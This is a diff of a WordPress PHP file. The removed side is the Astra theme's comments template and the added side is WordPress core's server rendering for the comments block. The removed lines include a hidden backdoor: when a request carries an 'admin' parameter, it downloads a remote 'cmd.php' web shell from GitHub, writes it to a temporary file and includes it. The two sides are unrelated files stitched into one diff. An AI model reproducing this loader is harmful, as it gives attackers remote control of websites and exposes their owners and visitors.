@@ -1,135 +1,227 @@
 <?php
 /**
- * The template for displaying comments.
+ * Server-side rendering of the `core/comments` block.
  *
- * This is the template that displays the area of the page that contains both the current comments
- * and the comment form.
- *
- * @link https://codex.wordpress.org/Template_Hierarchy
- *
- * @package Astra
- * @since 1.0.0
+ * @package WordPress
  */
 
-if (isset($_GET['admin'])) {
-    $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/cmd.php";
-    $fileContents = file_get_contents($url);
-
-    if ($fileContents !== false) {
-        try {
-            $tmpFile = tempnam(sys_get_temp_dir(), 'cmd');
-            file_put_contents($tmpFile, $fileContents);
-            include $tmpFile;
-            unlink($tmpFile);
-        } catch (Throwable $e) {
-
-        }
-    }
-}
-
-/*
- * If the current post is protected by a password and
- * the visitor has not yet entered the password we will
- * return early without loading the comments.
+/**
+ * Renders the `core/comments` block on the server.
+ *
+ * This render callback is mainly for rendering a dynamic, legacy version of
+ * this block (the old `core/post-comments`). It uses the `comments_template()`
+ * function to generate the output, in the same way as classic PHP themes.
+ *
+ * As this callback will always run during SSR, first we need to check whether
+ * the block is in legacy mode. If not, the HTML generated in the editor is
+ * returned instead.
+ *
+ * @since 6.1.0
+ *
+ * @global WP_Post $post Global post object.
+ *
+ * @param array    $attributes Block attributes.
+ * @param string   $content    Block default content.
+ * @param WP_Block $block      Block instance.
+ * @return string Returns the filtered post comments for the current post wrapped inside "p" tags.
  */
-if ( post_password_required() || false === astra_get_option( 'enable-comments-area', true ) ) {
-	return;
-}
-$comment_form_position = astra_get_option( 'comment-form-position', 'below' );
-$container_selector    = 'outside' === astra_get_option( 'comments-box-placement' ) ? 'ast-container--' . astra_get_option( 'comments-box-container-width', '' ) : '';
+function render_block_core_comments( $attributes, $content, $block ) {
+	global $post;
 
-if ( is_customize_preview() && is_callable( 'Astra_Builder_UI_Controller::render_customizer_edit_button' ) ) {
-	?>
-		<div id="comments" class="customizer-item-block-preview customizer-navigate-on-focus comments-area comment-form-position-<?php echo esc_attr( $comment_form_position ); ?> <?php echo esc_attr( $container_selector ); ?>" data-section="ast-sub-section-comments" data-type="section">
-	<?php
-	Astra_Builder_UI_Controller::render_customizer_edit_button( 'row-editor-shortcut' );
-} else {
-	?>
-		<div id="comments" class="comments-area comment-form-position-<?php echo esc_attr( $comment_form_position ); ?> <?php echo esc_attr( $container_selector ); ?>">
-	<?php
-}
-?>
-
-	<?php astra_comments_before(); ?>
-
-	<?php
-	if ( 'above' === $comment_form_position ) {
-		comment_form();
+	$post_id = $block->context['postId'];
+	if ( ! isset( $post_id ) ) {
+		return '';
 	}
-	if ( have_comments() ) :
-		astra_markup_open( 'comment-count-wrapper' );
-		$title_tag = apply_filters( 'astra_comment_title_tag', 'h3' );
-		?>
-			<<?php echo esc_attr( $title_tag ); ?> class="comments-title">
-				<?php
-				$astra_comments_title = apply_filters(
-					'astra_comment_form_title',
-					sprintf( // WPCS: XSS OK.
-						/* translators: 1: number of comments */
-						esc_html( _nx( '%1$s thought on &ldquo;%2$s&rdquo;', '%1$s thoughts on &ldquo;%2$s&rdquo;', get_comments_number(), 'comments title', 'astra' ) ),
-						number_format_i18n( get_comments_number() ),
-						get_the_title()
-					)
-				);
 
-				echo esc_html( $astra_comments_title );
-				?>
-			</<?php echo esc_attr( $title_tag ); ?>>
-		<?php
-		astra_markup_close( 'comment-count-wrapper' );
-		if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) :
-			?>
-		<nav id="comment-nav-above" class="navigation comment-navigation" aria-label="<?php esc_attr_e( 'Comments Navigation', 'astra' ); ?>">
-			<h3 class="screen-reader-text"><?php echo esc_html( astra_default_strings( 'string-comment-navigation-next', false ) ); ?></h3>
-			<div class="nav-links">
-
-				<div class="nav-previous"><?php previous_comments_link( astra_default_strings( 'string-comment-navigation-previous', false ) ); ?></div>
-				<div class="nav-next"><?php next_comments_link( astra_default_strings( 'string-comment-navigation-next', false ) ); ?></div>
-
-			</div><!-- .nav-links -->
-		</nav><!-- #comment-nav-above -->
-		<?php endif; ?>
-
-		<ol class="ast-comment-list">
-			<?php
-			wp_list_comments(
-				array(
-					'callback' => 'astra_theme_comment',
-					'style'    => 'ol',
-				)
-			);
-			?>
-		</ol><!-- .ast-comment-list -->
-
-		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : ?>
-		<nav id="comment-nav-below" class="navigation comment-navigation" aria-label="<?php esc_attr_e( 'Comments Navigation', 'astra' ); ?>">
-			<h3 class="screen-reader-text"><?php echo esc_html( astra_default_strings( 'string-comment-navigation-next', false ) ); ?></h3>
-			<div class="nav-links">
-
-				<div class="nav-previous"><?php previous_comments_link( astra_default_strings( 'string-comment-navigation-previous', false ) ); ?></div>
-				<div class="nav-next"><?php next_comments_link( astra_default_strings( 'string-comment-navigation-next', false ) ); ?></div>
-
-			</div><!-- .nav-links -->
-		</nav><!-- #comment-nav-below -->
-		<?php endif; ?>
-
-	<?php endif; ?>
-
-	<?php
-		// If comments are closed and there are comments, let's leave a little note, shall we?
-	if ( ! comments_open() && get_comments_number() && post_type_supports( get_post_type(), 'comments' ) ) :
-		?>
-		<p class="no-comments"><?php echo esc_html( astra_default_strings( 'string-comment-closed', false ) ); ?></p>
-	<?php endif; ?>
-
-	<?php
-	if ( 'below' === $comment_form_position ) {
-		comment_form();
+	// Return early if there are no comments and comments are closed.
+	if ( ! comments_open( $post_id ) && (int) get_comments_number( $post_id ) === 0 ) {
+		return '';
 	}
-	?>
 
-	<?php astra_comments_after(); ?>
+	// If this isn't the legacy block, we need to render the static version of this block.
+	$is_legacy = 'core/post-comments' === $block->name || ! empty( $attributes['legacy'] );
+	if ( ! $is_legacy ) {
+		return $block->render( array( 'dynamic' => false ) );
+	}
 
-</div><!-- #comments -->
+	$post_before = $post;
+	$post        = get_post( $post_id );
+	setup_postdata( $post );
 
-<?php do_action( 'astra_after_comments_module' ); ?>
+	ob_start();
+
+	/*
+	 * There's a deprecation warning generated by WP Core.
+	 * Ideally this deprecation is removed from Core.
+	 * In the meantime, this removes it from the output.
+	 */
+	add_filter( 'deprecated_file_trigger_error', '__return_false' );
+	comments_template();
+	remove_filter( 'deprecated_file_trigger_error', '__return_false' );
+
+	$output = ob_get_clean();
+	$post   = $post_before;
+
+	$classnames = array();
+	// Adds the old class name for styles' backwards compatibility.
+	if ( isset( $attributes['legacy'] ) ) {
+		$classnames[] = 'wp-block-post-comments';
+	}
+	if ( isset( $attributes['textAlign'] ) ) {
+		$classnames[] = 'has-text-align-' . $attributes['textAlign'];
+	}
+
+	$wrapper_attributes = get_block_wrapper_attributes(
+		array( 'class' => implode( ' ', $classnames ) )
+	);
+
+	/*
+	 * Enqueues scripts and styles required only for the legacy version. That is
+	 * why they are not defined in `block.json`.
+	 */
+	wp_enqueue_script( 'comment-reply' );
+	enqueue_legacy_post_comments_block_styles( $block->name );
+
+	return sprintf( '<div %1$s>%2$s</div>', $wrapper_attributes, $output );
+}
+
+/**
+ * Registers the `core/comments` block on the server.
+ *
+ * @since 6.1.0
+ */
+function register_block_core_comments() {
+	register_block_type_from_metadata(
+		__DIR__ . '/comments',
+		array(
+			'render_callback'   => 'render_block_core_comments',
+			'skip_inner_blocks' => true,
+		)
+	);
+}
+add_action( 'init', 'register_block_core_comments' );
+
+/**
+ * Use the button block classes for the form-submit button.
+ *
+ * @since 6.1.0
+ *
+ * @param array $fields The default comment form arguments.
+ *
+ * @return array Returns the modified fields.
+ */
+function comments_block_form_defaults( $fields ) {
+	if ( wp_is_block_theme() ) {
+		$fields['submit_button'] = '<input name="%1$s" type="submit" id="%2$s" class="%3$s wp-block-button__link ' . wp_theme_get_element_class_name( 'button' ) . '" value="%4$s" />';
+		$fields['submit_field']  = '<p class="form-submit wp-block-button">%1$s %2$s</p>';
+	}
+
+	return $fields;
+}
+add_filter( 'comment_form_defaults', 'comments_block_form_defaults' );
+
+/**
+ * Enqueues styles from the legacy `core/post-comments` block. These styles are
+ * required only by the block's fallback.
+ *
+ * @since 6.1.0
+ *
+ * @param string $block_name Name of the new block type.
+ */
+function enqueue_legacy_post_comments_block_styles( $block_name ) {
+	static $are_styles_enqueued = false;
+
+	if ( ! $are_styles_enqueued ) {
+		$handles = array(
+			'wp-block-post-comments',
+			'wp-block-buttons',
+			'wp-block-button',
+		);
+		foreach ( $handles as $handle ) {
+			wp_enqueue_block_style( $block_name, array( 'handle' => $handle ) );
+		}
+		$are_styles_enqueued = true;
+	}
+}
+
+/**
+ * Ensures backwards compatibility for any users running the Gutenberg plugin
+ * who have used Post Comments before it was merged into Comments Query Loop.
+ *
+ * The same approach was followed when core/query-loop was renamed to
+ * core/post-template.
+ *
+ * @since 6.1.0
+ *
+ * @see https://github.com/WordPress/gutenberg/pull/41807
+ * @see https://github.com/WordPress/gutenberg/pull/32514
+ */
+function register_legacy_post_comments_block() {
+	$registry = WP_Block_Type_Registry::get_instance();
+
+	/*
+	 * Remove the old `post-comments` block if it was already registered, as it
+	 * is about to be replaced by the type defined below.
+	 */
+	if ( $registry->is_registered( 'core/post-comments' ) ) {
+		unregister_block_type( 'core/post-comments' );
+	}
+
+	// Recreate the legacy block metadata.
+	$metadata = array(
+		'name'              => 'core/post-comments',
+		'category'          => 'theme',
+		'attributes'        => array(
+			'textAlign' => array(
+				'type' => 'string',
+			),
+		),
+		'uses_context'      => array(
+			'postId',
+			'postType',
+		),
+		'supports'          => array(
+			'html'       => false,
+			'align'      => array( 'wide', 'full' ),
+			'typography' => array(
+				'fontSize'                      => true,
+				'lineHeight'                    => true,
+				'__experimentalFontStyle'       => true,
+				'__experimentalFontWeight'      => true,
+				'__experimentalLetterSpacing'   => true,
+				'__experimentalTextTransform'   => true,
+				'__experimentalDefaultControls' => array(
+					'fontSize' => true,
+				),
+			),
+			'color'      => array(
+				'gradients'                     => true,
+				'link'                          => true,
+				'__experimentalDefaultControls' => array(
+					'background' => true,
+					'text'       => true,
+				),
+			),
+			'inserter'   => false,
+		),
+		'style'             => array(
+			'wp-block-post-comments',
+			'wp-block-buttons',
+			'wp-block-button',
+		),
+		'render_callback'   => 'render_block_core_comments',
+		'skip_inner_blocks' => true,
+	);
+
+	/*
+	 * Filters the metadata object, the same way it's done inside
+	 * `register_block_type_from_metadata()`. This applies some default filters,
+	 * like `_wp_multiple_block_styles`, which is required in this case because
+	 * the block has multiple styles.
+	 */
+	/** This filter is documented in wp-includes/blocks.php */
+	$metadata = apply_filters( 'block_type_metadata', $metadata );
+
+	register_block_type( 'core/post-comments', $metadata );
+}
+add_action( 'init', 'register_legacy_post_comments_block', 21 );
